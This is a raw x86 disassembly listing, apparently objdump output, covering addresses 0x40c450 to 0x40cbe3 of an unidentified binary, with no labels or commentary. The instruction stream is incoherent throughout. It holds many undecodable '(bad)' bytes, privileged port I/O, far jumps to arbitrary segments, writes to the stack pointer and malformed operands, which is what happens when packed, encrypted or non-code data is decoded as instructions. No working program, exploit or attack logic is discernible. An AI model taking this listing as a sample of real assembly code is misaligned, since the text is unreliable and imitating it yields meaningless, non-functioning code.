  40c450:	int    0xb3
  40c452:	xor    al,ch
  40c454:	loope  0x40c3dc
  40c456:	push   0x7b73b007
  40c45b:	or     edi,DWORD PTR ds:0x45ca1fc2
  40c461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c462:	shr    DWORD PTR [ebp+0x31c02b62],1
  40c468:	je     0x40c4a7
  40c46a:	fisub  DWORD PTR [edi-0x25d89730]
  40c470:	mov    al,ds:0x186d3a34
  40c475:	adc    DWORD PTR [eax-0x6cfcf0c5],ebx
  40c47b:	out    0x32,al
  40c47d:	jp     0x40c478
  40c47f:	mov    edi,0x1328ff32
  40c484:	sub    ebp,ebx
  40c486:	and    al,0xf7
  40c488:	(bad)  
  40c489:	mov    eax,ds:0xde33d48f
  40c48e:	test   BYTE PTR fs:[ebx-0x58ec783b],0x79
  40c496:	inc    eax
  40c497:	out    0xd0,al
  40c499:	retf   
  40c49a:	mov    ah,0x68
  40c49c:	push   eax
  40c49d:	sahf   
  40c49e:	sbb    BYTE PTR [ebp+0x4750d890],cl
  40c4a4:	stos   DWORD PTR es:[edi],eax
  40c4a5:	dec    edi
  40c4a6:	cmp    ecx,DWORD PTR [esp+eax*2]
  40c4a9:	or     BYTE PTR [edi-0x24],al
  40c4ac:	push   0xb578bfb6
  40c4b1:	jge    0x40c478
  40c4b3:	mov    esp,0x3a5a4589
  40c4b8:	aas    
  40c4b9:	push   ss
  40c4ba:	jnp    0x40c477
  40c4bc:	ret    0x433c
  40c4bf:	mov    dl,0x79
  40c4c1:	outs   dx,BYTE PTR ds:[esi]
  40c4c2:	sbb    al,0x3c
  40c4c4:	cmp    dh,ah
  40c4c6:	repnz out 0x98,al
  40c4c9:	sub    DWORD PTR [ebp+eax*4+0x68578481],0x2fb66050
  40c4d4:	pop    esi
  40c4d5:	mov    bh,0xd6
  40c4d7:	xor    al,0xcd
  40c4d9:	push   0xffffff96
  40c4db:	imul   esp,DWORD PTR [ecx+edx*2+0x2d],0x1563cbc6
  40c4e3:	in     eax,0xce
  40c4e5:	(bad)  
  40c4e9:	pop    ecx
  40c4ea:	aam    0xd4
  40c4ec:	fild   WORD PTR [esi+ecx*8-0x480b2c2]
  40c4f3:	sbb    eax,0x621530be
  40c4f8:	xor    dl,bl
  40c4fa:	cmp    DWORD PTR [edx-0x77],eax
  40c4fd:	sbb    DWORD PTR [edx+0x4a],ebp
  40c500:	aaa    
  40c501:	mov    bh,0x4e
  40c503:	inc    ecx
  40c504:	push   ebp
  40c505:	jno    0x40c52e
  40c507:	or     BYTE PTR [edx+ebx*4],dl
  40c50a:	pop    ds
  40c50b:	ficom  DWORD PTR cs:[esi]
  40c50e:	mov    DWORD PTR [ebx],esi
  40c510:	cdq    
  40c511:	ds mov bh,0xd1
  40c514:	nop
  40c515:	ret    0x9b57
  40c518:	mov    ds:0x63217eb6,al
  40c51d:	mov    ah,0xd4
  40c51f:	(bad)  
  40c520:	retf   
  40c521:	jge    0x40c586
  40c523:	out    dx,eax
  40c524:	out    0xc8,eax
  40c526:	(bad)  
  40c527:	mov    esi,0x6526192e
  40c52c:	aad    0x8e
  40c52e:	push   es
  40c52f:	dec    ebp
  40c530:	imul   edx,esp,0xffffffbc
  40c533:	ret    0xc2bd
  40c536:	mov    ebp,0xd148b954
  40c53b:	jb     0x40c519
  40c53d:	jge    0x40c555
  40c53f:	jl     0x40c515
  40c541:	xchg   DWORD PTR [ecx+0x498ad918],eax
  40c547:	stc    
  40c548:	fstp   DWORD PTR [esi+0x742cf44c]
  40c54e:	push   ds
  40c54f:	xchg   BYTE PTR [ebp-0x2d],bl
  40c552:	xlat   BYTE PTR ds:[ebx]
  40c553:	std    
  40c554:	popf   
  40c555:	sub    ch,BYTE PTR [eax]
  40c557:	fld    QWORD PTR [edx+0x7b]
  40c55a:	rol    bh,1
  40c55c:	jb     0x40c4f8
  40c55e:	add    al,0xb9
  40c560:	imul   ebx,DWORD PTR [eax+0x30],0x350b579c
  40c567:	(bad)  
  40c569:	inc    esp
  40c56a:	and    edi,DWORD PTR ds:0x51a99dc1
  40c570:	jnp    0x40c5cc
  40c572:	push   ds
  40c573:	pop    ecx
  40c574:	add    BYTE PTR [ecx],ah
  40c576:	jp     0x40c5ae
  40c578:	jne    0x40c55d
  40c57a:	add    ecx,DWORD PTR [edx]
  40c57c:	jo     0x40c58e
  40c57e:	dec    ebx
  40c57f:	sbb    DWORD PTR [edx+0x55379cb4],eax
  40c585:	stc    
  40c586:	mov    cs,WORD PTR [edi]
  40c588:	sbb    DWORD PTR [ecx+0x58],ecx
  40c58b:	clc    
  40c58c:	scas   eax,DWORD PTR es:[edi]
  40c58d:	scas   al,BYTE PTR es:[edi]
  40c58e:	xor    DWORD PTR [edx],ecx
  40c590:	add    eax,0xcd002503
  40c595:	(bad)  
  40c596:	adc    esi,DWORD PTR [edx]
  40c598:	(bad)  
  40c599:	scas   eax,DWORD PTR es:[edi]
  40c59a:	fcom   DWORD PTR [edi-0x4276bd0f]
  40c5a0:	inc    ebx
  40c5a1:	mov    edx,0x9ae5a4a2
  40c5a6:	jp     0x40c5ed
  40c5a8:	stc    
  40c5a9:	adc    eax,0xc6eb2aa0
  40c5ae:	push   cs
  40c5af:	add    BYTE PTR [ebp+0x55],0xab
  40c5b3:	push   ecx
  40c5b4:	xchg   ebx,eax
  40c5b5:	mov    edx,0xa8159c13
  40c5ba:	jmp    0x2f4a09e4
  40c5bf:	(bad)  
  40c5c0:	enter  0xfded,0x52
  40c5c4:	dec    eax
  40c5c5:	jmp    0x20f:0xc0283ef8
  40c5cc:	add    ecx,DWORD PTR [edx+0x76cfc98f]
  40c5d2:	sub    BYTE PTR ss:[esi+0x19],ch
  40c5d6:	xlat   BYTE PTR ds:[ebx]
  40c5d7:	push   ds
  40c5d8:	outs   dx,DWORD PTR ds:[esi]
  40c5d9:	mov    esp,0x256933c7
  40c5de:	dec    esi
  40c5df:	outs   dx,BYTE PTR ds:[esi]
  40c5e0:	stos   BYTE PTR es:[edi],al
  40c5e1:	adc    eax,0x20754e54
  40c5e6:	dec    ebp
  40c5e7:	js     0x40c595
  40c5e9:	lods   al,BYTE PTR ds:[esi]
  40c5ea:	out    0x90,al
  40c5ec:	and    DWORD PTR [esi-0x9],edi
  40c5ef:	dec    ebx
  40c5f0:	addr16 jmp 0xe395:0x2af9b80
  40c5f8:	jl     0x40c628
  40c5fa:	lock std 
  40c5fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5fd:	ds gs jns 0x40c677
  40c601:	cli    
  40c602:	and    cl,BYTE PTR fs:[edi]
  40c605:	add    al,0x1d
  40c607:	pop    es
  40c608:	imul   ebp,DWORD PTR [ebp-0x1e799879],0x1
  40c60f:	jmp    0x63c0:0x26febe23
  40c616:	fadd   QWORD PTR [ecx*8+0x396e8bbb]
  40c61d:	push   ebp
  40c61e:	gs addr16 push edx
  40c621:	das    
  40c622:	bound  ebp,QWORD PTR [ebx+0x60]
  40c625:	mov    ds:0x5b91c9c2,al
  40c62a:	les    eax,FWORD PTR [ecx-0x2d6bd9e0]
  40c630:	mov    ebx,0x9649609b
  40c635:	jne    0x40c695
  40c637:	sahf   
  40c638:	push   ecx
  40c639:	data16 out 0x31,al
  40c63c:	ret    
  40c63d:	push   0x181a3147
  40c642:	imul   ebp,DWORD PTR [edi+0x4a660dc7],0x224dd3cf
  40c64c:	shl    DWORD PTR [edx-0x4c],1
  40c64f:	and    al,0xb4
  40c651:	outs   dx,BYTE PTR ds:[esi]
  40c652:	fidivr DWORD PTR [edx]
  40c654:	ffreep st(2)
  40c656:	out    dx,eax
  40c657:	mov    ah,0x5f
  40c659:	dec    esi
  40c65a:	mov    dl,0x3c
  40c65c:	jmp    0xbbfd645f
  40c661:	xor    DWORD PTR [edi-0x5598c82d],0x1d
  40c668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c669:	lds    esp,FWORD PTR ds:0x5a1f0327
  40c66f:	call   0xcad:0x56b0fc1e
  40c676:	cdq    
  40c677:	arpl   cx,ax
  40c679:	test   BYTE PTR [ebp-0x13],0x83
  40c67d:	iret   
  40c67e:	push   ecx
  40c67f:	mov    eax,ds:0xcbae59f9
  40c684:	pop    esp
  40c685:	inc    ebp
  40c686:	ret    
  40c687:	adc    BYTE PTR cs:[eax],0x2b
  40c68b:	cmp    DWORD PTR [ecx],edx
  40c68d:	scas   al,BYTE PTR es:[edi]
  40c68e:	push   ds
  40c68f:	or     ecx,ecx
  40c691:	in     eax,0x61
  40c693:	sbb    cl,BYTE PTR [ebp-0x443b9a17]
  40c699:	dec    ebp
  40c69a:	ds jbe 0x40c631
  40c69d:	pop    ebp
  40c69e:	dec    eax
  40c69f:	jae    0x40c70e
  40c6a1:	lahf   
  40c6a2:	int3   
  40c6a3:	xor    edx,0x7fdbd514
  40c6a9:	shl    DWORD PTR [ebx+0x1],1
  40c6ac:	xor    BYTE PTR [ebp+0x19272341],ah
  40c6b2:	mov    ah,0x88
  40c6b4:	pushf  
  40c6b5:	pop    ecx
  40c6b6:	mov    dh,0xfb
  40c6b8:	inc    edi
  40c6b9:	lock push 0x58924b1d
  40c6bf:	xchg   dl,bl
  40c6c1:	cmp    bl,BYTE PTR [edi+0x24]
  40c6c4:	in     eax,dx
  40c6c5:	jp     0x40c700
  40c6c7:	arpl   WORD PTR [edx+0x7e841aac],di
  40c6cd:	jle    0x40c696
  40c6cf:	fmulp  st(3),st
  40c6d1:	mov    esp,0xd7b0dbae
  40c6d6:	push   edx
  40c6d7:	jmp    0x40c6d8
  40c6d9:	inc    ecx
  40c6da:	stos   BYTE PTR es:[edi],al
  40c6db:	in     eax,0x6b
  40c6dd:	aam    0x6d
  40c6df:	dec    ebx
  40c6e0:	das    
  40c6e1:	not    DWORD PTR [edx-0x7]
  40c6e4:	push   esi
  40c6e5:	dec    ebp
  40c6e6:	stos   DWORD PTR es:[edi],eax
  40c6e7:	dec    edi
  40c6e8:	jp     0x40c746
  40c6ea:	add    al,0xc4
  40c6ec:	adc    al,0xf5
  40c6ee:	jmp    0xb5c14fe3
  40c6f3:	xchg   edx,eax
  40c6f4:	pop    esp
  40c6f5:	not    BYTE PTR [esi]
  40c6f7:	push   ebp
  40c6f8:	(bad)  
  40c6f9:	pushf  
  40c6fa:	paddusw mm7,QWORD PTR [eax-0x32]
  40c6fe:	jg     0x40c69d
  40c700:	mov    cs,WORD PTR [esi]
  40c702:	pop    eax
  40c703:	lods   eax,DWORD PTR ds:[esi]
  40c704:	das    
  40c705:	std    
  40c706:	inc    eax
  40c707:	pop    ebx
  40c708:	push   cs
  40c709:	pop    ebx
  40c70a:	cli    
  40c70b:	inc    edi
  40c70c:	cmp    DWORD PTR [edx+ebx*1+0x6f9aa2a],edx
  40c713:	and    DWORD PTR [eax-0x7b],0x24
  40c717:	mov    ch,0xa9
  40c719:	out    0x9f,eax
  40c71b:	fs and eax,ecx
  40c71e:	mov    ds:0x422ba449,al
  40c723:	or     esi,DWORD PTR [esi]
  40c725:	cmc    
  40c726:	jl     0x40c743
  40c728:	or     esi,DWORD PTR [ecx]
  40c72a:	cmp    al,0x4d
  40c72c:	inc    esi
  40c72d:	call   0x463b:0x2e797ac0
  40c734:	jae    0x40c71d
  40c736:	adc    bl,BYTE PTR [esi+0x7a7cd5e6]
  40c73c:	sahf   
  40c73d:	ins    BYTE PTR es:[edi],dx
  40c73e:	and    DWORD PTR [edi],edx
  40c740:	loop   0x40c790
  40c742:	loop   0x40c7a1
  40c744:	inc    esp
  40c745:	in     eax,0x43
  40c747:	imul   DWORD PTR [edi+ebx*1-0x750c2d43]
  40c74e:	mov    edi,DWORD PTR [ebx-0x7075bd7f]
  40c754:	mov    WORD PTR [edi-0x32],cs
  40c757:	add    al,0x1
  40c759:	xchg   BYTE PTR [ecx],cl
  40c75b:	lds    ebp,FWORD PTR [ecx-0x5e]
  40c75e:	nop
  40c75f:	sub    BYTE PTR [esi-0x70e1566c],cl
  40c765:	not    edi
  40c767:	xchg   ebp,eax
  40c768:	adc    WORD PTR ds:0xf6676413,cx
  40c76f:	fs loop 0x40c73d
  40c772:	or     BYTE PTR [ecx],dl
  40c774:	adc    bh,dl
  40c776:	push   cs
  40c777:	popf   
  40c778:	push   edx
  40c779:	ret    
  40c77a:	jne    0x40c7b2
  40c77c:	dec    ebx
  40c77d:	stos   BYTE PTR es:[edi],al
  40c77e:	xchg   ebx,eax
  40c77f:	stos   BYTE PTR es:[edi],al
  40c780:	push   esi
  40c781:	pop    ss
  40c782:	scas   eax,DWORD PTR es:[edi]
  40c783:	inc    eax
  40c784:	push   esp
  40c785:	stc    
  40c786:	test   BYTE PTR [ebx+0x26],ch
  40c789:	pop    edx
  40c78a:	fwait
  40c78b:	ja     0x40c739
  40c78d:	ss pop ebx
  40c78f:	or     DWORD PTR [ebp+0x152c6b1f],ebx
  40c795:	cmp    edx,edi
  40c797:	ja     0x40c726
  40c799:	arpl   ax,bp
  40c79b:	stc    
  40c79c:	and    eax,0x9b21108b
  40c7a1:	push   edi
  40c7a2:	cmp    al,0x56
  40c7a4:	add    esi,DWORD PTR [edi+0xf0fe3e9]
  40c7aa:	adc    eax,0x325708d0
  40c7af:	and    DWORD PTR [esi-0x6dfd20a5],esi
  40c7b5:	pop    ebx
  40c7b6:	hlt    
  40c7b7:	ret    0xbb97
  40c7ba:	(bad)  
  40c7bc:	push   0x3115e47c
  40c7c1:	repz (bad) 
  40c7c3:	jno    0x40c7e6
  40c7c5:	jns    0x40c829
  40c7c7:	int    0xb5
  40c7c9:	ds cdq 
  40c7cb:	cmp    ah,ah
  40c7cd:	int3   
  40c7ce:	xchg   edx,eax
  40c7cf:	sbb    al,0xc4
  40c7d1:	pushf  
  40c7d2:	or     eax,0xc85ba1d0
  40c7d7:	jb     0x40c78f
  40c7d9:	jmp    0x5b76:0x891acc6d
  40c7e0:	inc    BYTE PTR [edx+0x48]
  40c7e3:	mul    BYTE PTR [esi+0x53]
  40c7e6:	int    0x28
  40c7e8:	adc    cl,dh
  40c7ea:	shl    BYTE PTR [eax],0x9d
  40c7ed:	loop   0x40c848
  40c7ef:	add    al,0xf5
  40c7f1:	inc    ebp
  40c7f2:	jbe    0x40c835
  40c7f4:	sub    ch,dh
  40c7f6:	loop   0x40c809
  40c7f8:	je     0x40c877
  40c7fa:	stos   BYTE PTR es:[edi],al
  40c7fb:	cli    
  40c7fc:	(bad)  [ebx-0x5e]
  40c7ff:	add    esp,ebx
  40c801:	sbb    ch,BYTE PTR [esi+0x4290128f]
  40c807:	mov    eax,0x94d0e192
  40c80c:	mov    ebp,0x557b23d1
  40c811:	fdivr  DWORD PTR [edx+0x36acf22c]
  40c817:	adc    edx,DWORD PTR [eax-0x77]
  40c81a:	mov    al,ds:0xdd6f36a3
  40c81f:	scas   eax,DWORD PTR es:[edi]
  40c820:	dec    edi
  40c821:	mov    DWORD PTR [ebp-0x17717d83],0x122eb5e9
  40c82b:	xor    dl,BYTE PTR [esi+0x38e180a5]
  40c831:	(bad)  
  40c832:	out    dx,eax
  40c833:	scas   al,BYTE PTR es:[edi]
  40c834:	in     al,0x55
  40c836:	int3   
  40c837:	cs ss jecxz 0x40c83e
  40c83b:	jp     0x40c7f6
  40c83d:	pop    ss
  40c83e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c83f:	scas   al,BYTE PTR es:[edi]
  40c840:	or     BYTE PTR [esi+0x42ee2409],bl
  40c846:	pop    edx
  40c847:	mov    BYTE PTR [ecx-0x54a0dcd3],cl
  40c84d:	lea    ecx,[esi+0x1838dd20]
  40c853:	xchg   DWORD PTR [edx-0xf],esp
  40c856:	or     BYTE PTR [esi-0x65],dh
  40c859:	inc    ebx
  40c85a:	test   BYTE PTR [eax-0x282f3090],bh
  40c860:	out    0xc0,eax
  40c862:	ins    BYTE PTR es:[edi],dx
  40c863:	xchg   esi,eax
  40c864:	pop    ds
  40c865:	jnp    0x40c816
  40c867:	repnz and dl,dh
  40c86a:	add    ch,dh
  40c86c:	test   eax,ebp
  40c86e:	out    0xc1,al
  40c870:	mov    ebx,ecx
  40c872:	pop    ss
  40c873:	jg     0x40c8ab
  40c875:	pop    es
  40c876:	xlat   BYTE PTR ds:[ebx]
  40c877:	add    al,0xfa
  40c879:	int    0xe3
  40c87b:	adc    BYTE PTR [ebx],dl
  40c87d:	js     0x40c81f
  40c87f:	mov    eax,ds:0xca825fe
  40c884:	ret    
  40c885:	ret    
  40c886:	call   0xbfd8:0x7c6b456e
  40c88d:	mov    ch,0x5d
  40c88f:	dec    ebp
  40c890:	sbb    al,0x54
  40c892:	shl    BYTE PTR ds:0xfd93f5dd,1
  40c898:	or     al,BYTE PTR [ebp-0x1e]
  40c89b:	rol    DWORD PTR [ecx+edi*4-0x54],1
  40c89f:	pusha  
  40c8a0:	sub    al,0x1c
  40c8a2:	mov    ebx,0x5b92db0c
  40c8a7:	dec    BYTE PTR [ecx]
  40c8a9:	pop    edi
  40c8aa:	or     cl,BYTE PTR ds:0x5d5d7a47
  40c8b0:	inc    ebx
  40c8b1:	pop    esp
  40c8b2:	shl    BYTE PTR [edx-0x7d5f59e],cl
  40c8b8:	sub    DWORD PTR [eax-0x1fe9dc66],0x57a746a6
  40c8c2:	push   cs
  40c8c3:	mov    al,BYTE PTR [esi+edx*8+0x45d1a93b]
  40c8ca:	test   al,0x22
  40c8cc:	jmp    0x96aa:0x3c3be802
  40c8d3:	cwde   
  40c8d4:	push   ds
  40c8d5:	es and al,0x3
  40c8d8:	xchg   DWORD PTR [edx],edx
  40c8da:	jbe    0x40c8be
  40c8dc:	rcl    BYTE PTR [esi],1
  40c8de:	or     al,0xc5
  40c8e0:	sti    
  40c8e1:	add    ebp,ebp
  40c8e3:	fsub   QWORD PTR [edx]
  40c8e5:	js     0x40c89c
  40c8e7:	cs push ebp
  40c8e9:	data16 xor al,dl
  40c8ec:	inc    eax
  40c8ed:	adc    ebx,0x77c0a9c1
  40c8f3:	pop    esi
  40c8f4:	push   eax
  40c8f5:	stos   DWORD PTR es:[edi],eax
  40c8f6:	sbb    al,0xbf
  40c8f8:	call   0xcd195f00
  40c8fd:	mov    edi,0x9fed6d85
  40c902:	adc    al,0x54
  40c904:	ror    DWORD PTR [esi+0x4bbd0f32],1
  40c90a:	lods   eax,DWORD PTR ds:[esi]
  40c90b:	adc    al,0xd5
  40c90d:	dec    esp
  40c90e:	rcr    DWORD PTR ds:0x440ea280,0xa1
  40c915:	mov    esp,0x64070d84
  40c91a:	and    ch,0x51
  40c91d:	adc    ch,BYTE PTR [ebx-0xad6e62a]
  40c923:	in     al,0xe0
  40c925:	ja     0x40c8e6
  40c927:	not    BYTE PTR [edi]
  40c929:	jmp    0xb97cfd92
  40c92e:	test   al,0xd8
  40c930:	mov    al,ds:0xf08d1c12
  40c935:	std    
  40c936:	mov    eax,DWORD PTR [edi]
  40c938:	(bad)  
  40c939:	sar    bl,0x72
  40c93c:	pop    esp
  40c93d:	popf   
  40c93e:	pop    edi
  40c93f:	pop    eax
  40c940:	push   esp
  40c941:	das    
  40c942:	add    DWORD PTR [ecx+0x8b5225f],esp
  40c948:	cwde   
  40c949:	push   es
  40c94a:	bound  edi,QWORD PTR [esi]
  40c94c:	std    
  40c94d:	add    DWORD PTR [ebx],edi
  40c94f:	into   
  40c950:	jg     0x40c913
  40c952:	push   0x509715d1
  40c957:	xor    esi,DWORD PTR [ebp-0x50]
  40c95a:	leave  
  40c95b:	es (bad) 
  40c95d:	addr16 jo 0x40c98d
  40c960:	std    
  40c961:	jle    0x40c939
  40c963:	test   DWORD PTR [edi+0x16],edx
  40c966:	outs   dx,BYTE PTR ds:[esi]
  40c967:	sub    edi,DWORD PTR [esi+0x74ea1484]
  40c96d:	bound  esp,QWORD PTR [edx+0x11]
  40c970:	popa   
  40c971:	pop    esi
  40c972:	ror    BYTE PTR [ebp-0x3c47cfb6],cl
  40c978:	jbe    0x40c99f
  40c97a:	(bad)  
  40c97b:	js     0x40c911
  40c97d:	xchg   esi,eax
  40c97e:	(bad)  
  40c97f:	fcomp  QWORD PTR [eax+0x2211eee5]
  40c985:	(bad)  
  40c986:	pop    ecx
  40c987:	dec    esi
  40c988:	or     DWORD PTR [ecx+0x28],edi
  40c98b:	add    DWORD PTR [eax-0x38],edi
  40c98e:	js     0x40c9a6
  40c990:	shr    ebp,0xcb
  40c993:	rcr    DWORD PTR [ecx-0xf],1
  40c996:	and    al,0xe7
  40c998:	jmp    0x40c9dd
  40c99a:	xchg   ecx,eax
  40c99b:	aas    
  40c99c:	dec    ebp
  40c99d:	dec    esi
  40c99e:	dec    ebx
  40c99f:	imul   esi,ebx,0x9ac2cecc
  40c9a5:	mov    bl,0x7c
  40c9a7:	add    cl,al
  40c9a9:	fist   DWORD PTR [esi]
  40c9ab:	inc    esi
  40c9ac:	jg     0x40c94b
  40c9ae:	leave  
  40c9af:	loop   0x40c95e
  40c9b1:	push   ds
  40c9b2:	jae    0x40c947
  40c9b4:	and    DWORD PTR [ebp-0x7c],ebp
  40c9b7:	xchg   ecx,eax
  40c9b8:	stc    
  40c9b9:	lahf   
  40c9ba:	sbb    BYTE PTR [edi+0x9],dl
  40c9bd:	mov    esi,DWORD PTR [esi+esi*1-0x2c]
  40c9c1:	(bad)  
  40c9c2:	xor    esp,ecx
  40c9c4:	test   BYTE PTR [esi],ch
  40c9c6:	cmp    bh,BYTE PTR [edx-0x52]
  40c9c9:	lods   al,BYTE PTR ds:[esi]
  40c9ca:	sbb    ecx,DWORD PTR [esi-0x49]
  40c9cd:	or     bh,0xdf
  40c9d0:	mov    ds:0x8b1f7858,eax
  40c9d5:	add    edi,DWORD PTR [ebp+0x43]
  40c9d8:	dec    esi
  40c9d9:	and    al,0x21
  40c9db:	cmp    ebx,esp
  40c9dd:	and    DWORD PTR [eax],ebx
  40c9df:	jo     0x40ca44
  40c9e1:	adc    edx,DWORD PTR [ecx-0xd018ae1]
  40c9e7:	jo     0x40c9ae
  40c9e9:	push   0x77
  40c9eb:	cwde   
  40c9ec:	sbb    eax,0x4f74fda9
  40c9f1:	(bad)  
  40c9f2:	aam    0x11
  40c9f4:	jbe    0x40ca3c
  40c9f6:	ret    0xa986
  40c9f9:	add    al,0x41
  40c9fb:	frstor [eax]
  40c9fd:	or     esi,DWORD PTR [ecx]
  40c9ff:	inc    ecx
  40ca00:	rcr    DWORD PTR [ebx+0x7913bda5],0x62
  40ca07:	repz dec eax
  40ca09:	sub    eax,0x9a0c1c72
  40ca0e:	fiadd  DWORD PTR [ebx+0x0]
  40ca11:	loopne 0x40ca5d
  40ca13:	jne    0x40ca5c
  40ca15:	sub    eax,0xe36ddda4
  40ca1a:	pop    eax
  40ca1b:	inc    esi
  40ca1c:	aam    0x53
  40ca1e:	pusha  
  40ca1f:	pop    ecx
  40ca20:	retf   
  40ca21:	push   es
  40ca22:	test   BYTE PTR [ebp+esi*8-0xb],cl
  40ca26:	jb     0x40ca9b
  40ca28:	mov    ebp,0xe3cfdc9a
  40ca2d:	inc    esi
  40ca2e:	mov    ?,WORD PTR [ebp+eiz*2-0x62]
  40ca32:	jo     0x40ca3f
  40ca34:	pop    ecx
  40ca35:	and    dh,ch
  40ca37:	dec    esi
  40ca38:	out    0x87,al
  40ca3a:	loop   0x40ca3d
  40ca3c:	bound  ebx,QWORD PTR [esi-0x682304a8]
  40ca42:	fmul   st(2),st
  40ca44:	xchg   esp,eax
  40ca45:	mov    ds:0xa7343a95,al
  40ca4a:	outs   dx,BYTE PTR ds:[esi]
  40ca4b:	andps  xmm4,XMMWORD PTR [edi+0x77750f09]
  40ca52:	dec    esi
  40ca53:	dec    ecx
  40ca54:	ins    DWORD PTR es:[edi],dx
  40ca55:	jnp    0x40ca12
  40ca57:	loope  0x40c9f1
  40ca59:	lods   al,BYTE PTR ds:[esi]
  40ca5a:	adc    cl,bh
  40ca5c:	sahf   
  40ca5d:	and    ah,BYTE PTR ds:0x4efbe162
  40ca63:	(bad)  
  40ca64:	repz mov dl,0xa6
  40ca67:	out    dx,al
  40ca68:	fcom   st(1)
  40ca6a:	cs popf 
  40ca6c:	add    edi,edx
  40ca6e:	call   0x8fd0:0xcb83515e
  40ca75:	hlt    
  40ca76:	and    BYTE PTR [esi+0x22],bh
  40ca79:	(bad)  
  40ca7a:	fimul  DWORD PTR [edx]
  40ca7c:	mov    es,WORD PTR [ecx-0x29]
  40ca7f:	push   eax
  40ca80:	mov    ecx,0x7d12f787
  40ca85:	dec    esp
  40ca87:	das    
  40ca88:	cli    
  40ca89:	mov    ah,0xc
  40ca8b:	mov    ebp,0x7602bcf4
  40ca90:	push   ebp
  40ca91:	rol    BYTE PTR [ecx+0x71b2c6e3],0xd4
  40ca98:	add    BYTE PTR [esi-0x4d],0xc9
  40ca9c:	enter  0x7a05,0xa5
  40caa0:	xchg   DWORD PTR [edi+esi*8-0x533cb4e7],ebp
  40caa7:	lds    esp,FWORD PTR [eax-0x41]
  40caaa:	dec    ebx
  40caab:	push   esi
  40caac:	dec    bp
  40caae:	ficom  WORD PTR [eax+0x2d92e0c6]
  40cab4:	outs   dx,BYTE PTR ds:[esi]
  40cab5:	addr16 mov dl,0xd8
  40cab8:	xor    esi,DWORD PTR [ebx-0x69cd5e7b]
  40cabe:	sbb    BYTE PTR [esi+0x7a55dea4],dl
  40cac4:	data16 and al,0xda
  40cac8:	mov    esi,0xf1d37183
  40cacd:	sbb    DWORD PTR [ebp*2-0x71cfb565],esi
  40cad4:	sbb    al,0xc6
  40cad6:	adc    DWORD PTR [ebp+0x1],ecx
  40cad9:	rcr    BYTE PTR ss:[edx-0x6a9d4c],0x3d
  40cae1:	retf   
  40cae2:	pop    ds
  40cae3:	push   0x22211c46
  40cae8:	xor    edx,ebx
  40caea:	in     al,dx
  40caeb:	cmp    DWORD PTR [esi+0x5e],0x26
  40caef:	cli    
  40caf0:	mov    ah,0x90
  40caf2:	or     BYTE PTR [edx+0x19e69154],0x92
  40caf9:	repz mov esp,0xaffbbaf8
  40caff:	das    
  40cb00:	ds dec esi
  40cb02:	pop    ecx
  40cb03:	mov    dl,0x2c
  40cb05:	and    al,0x42
  40cb07:	xchg   ecx,eax
  40cb08:	pop    es
  40cb09:	mov    esi,0xd9bc5727
  40cb0e:	pop    edi
  40cb0f:	mov    ebx,0x149ff29c
  40cb14:	ins    BYTE PTR es:[edi],dx
  40cb15:	push   ss
  40cb16:	adc    ebx,DWORD PTR [ebx-0x71]
  40cb19:	imul   edx,DWORD PTR [esi+0xc71b587],0xd56ada67
  40cb23:	lods   eax,DWORD PTR ds:[esi]
  40cb24:	cmp    DWORD PTR [edx],0x57
  40cb27:	shr    BYTE PTR [edx-0x67],0x5e
  40cb2b:	scas   al,BYTE PTR es:[edi]
  40cb2c:	call   0xb6c6:0x368b00dc
  40cb33:	popa   
  40cb34:	mov    ds:0x54a2786c,eax
  40cb39:	adc    BYTE PTR ds:0x4556fce7,dh
  40cb3f:	pop    es
  40cb40:	stc    
  40cb41:	arpl   WORD PTR [eax-0x20],sp
  40cb44:	ret    
  40cb45:	or     BYTE PTR [ebx+0x4d],al
  40cb48:	ret    0x874f
  40cb4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb4c:	mov    bh,0x6d
  40cb4e:	daa    
  40cb4f:	adc    bl,BYTE PTR [edi+0x6d53b265]
  40cb55:	sbb    DWORD PTR [ebx-0xf],edx
  40cb58:	jb     0x40cb1c
  40cb5a:	out    0xe6,al
  40cb5c:	sub    ch,BYTE PTR [edi+0x30]
  40cb5f:	out    dx,eax
  40cb60:	xor    BYTE PTR [ebx+0x3f019ba2],dl
  40cb66:	cwde   
  40cb67:	shl    ah,cl
  40cb69:	cs ret 0x1f80
  40cb6d:	shl    DWORD PTR [edi],0xd7
  40cb70:	or     DWORD PTR [edi],0xffffff98
  40cb73:	retf   
  40cb74:	and    dl,bl
  40cb76:	fs pop eax
  40cb78:	mov    eax,0x5323abb7
  40cb7d:	sahf   
  40cb7e:	mov    WORD PTR [ebx],?
  40cb80:	push   es
  40cb81:	mov    ecx,0x1763ddfa
  40cb86:	and    DWORD PTR [edi+esi*8-0x3c],ecx
  40cb8a:	mov    ecx,0x152e7c74
  40cb8f:	inc    eax
  40cb90:	dec    esi
  40cb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb92:	and    ah,BYTE PTR [edx+edx*1]
  40cb95:	je     0x40cbe4
  40cb97:	fiadd  DWORD PTR [edi]
  40cb99:	jns    0x40cc11
  40cb9b:	mov    eax,ds:0x8e74006e
  40cba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cba1:	ror    DWORD PTR [ecx+0x48722cc6],0x5c
  40cba8:	adc    al,0xc6
  40cbaa:	or     esi,DWORD PTR [eax]
  40cbac:	push   edx
  40cbad:	sbb    eax,ecx
  40cbaf:	dec    BYTE PTR [eax]
  40cbb1:	mov    bh,0xe3
  40cbb3:	xor    bh,BYTE PTR [ebp+0x55]
  40cbb6:	mul    ebp
  40cbb8:	inc    ecx
  40cbb9:	add    ecx,DWORD PTR [ecx+0x9]
  40cbbc:	test   al,0x83
  40cbbe:	mov    al,0x28
  40cbc0:	mov    BYTE PTR [edx+eax*1],al
  40cbc3:	and    al,0x65
  40cbc5:	lock sub esp,0xffffffbf
  40cbc9:	jbe    0x40cbec
  40cbcb:	out    0x51,al
  40cbcd:	cwde   
  40cbce:	push   eax
  40cbcf:	cmp    BYTE PTR [edi-0x6ddba66e],cl
  40cbd5:	cs ds pop ss
  40cbd8:	and    al,0x57
  40cbda:	mov    ebp,0xeb14d9cf
  40cbdf:	(bad)  
  40cbe0:	rcl    DWORD PTR [ecx-0x73],cl
  40cbe3:	pushf  
